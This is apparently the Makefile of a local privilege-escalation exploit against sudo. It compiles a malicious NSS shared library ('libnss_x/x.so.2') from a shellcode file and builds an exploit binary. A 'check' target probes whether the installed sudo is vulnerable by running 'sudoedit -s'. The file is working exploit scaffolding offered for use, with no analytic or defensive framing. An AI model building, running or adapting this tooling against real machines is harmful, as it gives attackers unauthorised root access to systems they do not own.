CC     = gcc
CFLAGS = -O3 -Wall

.PHONY: all clean check

all: libnss_x/x.so.2 exploit

libnss_x/x.so.2: shellcode.c
	mkdir -p libnss_x
	$(CC) $(CFLAGS) -shared -nostdlib -o $@ $<

exploit: exploit.c
	$(CC) $(CFLAGS) -o $@ $<

check:
	@echo "[*] sudo version:"
	@sudo --version | head -1
	@echo "[*] vulnerability probe (vulnerable → password prompt or crash; patched → usage):"
	@sudoedit -s Y 2>&1 | head -5 || true

clean:
	rm -rf libnss_x exploit
